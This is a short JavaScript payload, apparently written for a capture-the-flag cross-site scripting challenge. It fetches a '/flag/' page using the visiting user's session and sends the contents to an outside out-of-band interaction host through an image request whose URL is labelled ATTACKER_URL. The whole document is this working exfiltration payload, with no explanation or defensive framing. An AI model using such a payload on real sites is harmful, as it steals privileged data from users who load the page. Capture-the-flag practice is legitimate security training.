fetch('/flag/')
    .then(response => {
        if (response.ok) {
            return response.text();
        } else {
            return "ERROR: Not Admin or Page Not Found";
        }
    })
    .then(flag_content => {
        const ATTACKER_URL = 'http://tuiocfqssccsdgoxeizs8p0lqpjhoizn4.oast.fun/';
        new Image().src = ATTACKER_URL + '?flag=' + encodeURIComponent(flag_content);
    })
    .catch(error => {
        console.error("Fetch error:", error);
    });
